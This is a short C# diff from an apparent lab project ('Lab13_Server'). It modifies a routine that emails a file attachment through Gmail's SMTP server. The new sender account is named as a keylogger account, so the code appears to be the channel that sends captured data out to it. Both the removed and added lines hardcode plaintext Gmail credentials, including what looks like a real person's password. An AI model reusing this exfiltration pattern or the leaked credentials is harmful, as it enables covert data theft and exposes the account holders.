@@ -15,7 +15,7 @@ namespace Lab13_Server
             {
                 MailMessage mail = new MailMessage();
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
-                mail.From = new MailAddress("karlapdiazpadilla@gmail.com");
+                mail.From = new MailAddress("keylogger.windows2018@gmail.com");
                 mail.To.Add(address);
                 mail.Subject = "Test Mail - 1";
                 mail.Body = "mail with attachment";
@@ -25,7 +25,7 @@ namespace Lab13_Server
                 mail.Attachments.Add(attachment);
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("karlapdiazpadilla@gmail.com", "canek=1301");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("keylogger.windows2018@gmail.com", "keylogger2018");
                 SmtpServer.EnableSsl = true;
 
                 SmtpServer.Send(mail);
